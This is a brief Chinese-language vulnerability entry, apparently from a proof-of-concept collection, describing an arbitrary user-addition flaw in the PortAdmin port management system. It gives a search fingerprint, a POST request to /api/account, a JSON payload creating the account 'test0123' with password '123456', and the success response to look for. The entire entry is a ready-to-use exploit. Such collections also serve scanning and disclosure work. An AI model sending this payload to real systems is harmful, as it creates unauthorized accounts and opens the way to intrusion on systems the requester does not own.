# PortAdmin端口管理系统account存在任意用户添加漏洞

PortAdmin ｜ 其他 ｜ —
- **指纹**：`"z0nA0XZ6VqnCB5fXpnneJg=="`
- **请求**：`POST /api/account HTTP/1.1`

**Payload**
```
{"username":"test0123","password":"123456"}
```
- **响应特征**：200 账号添加成功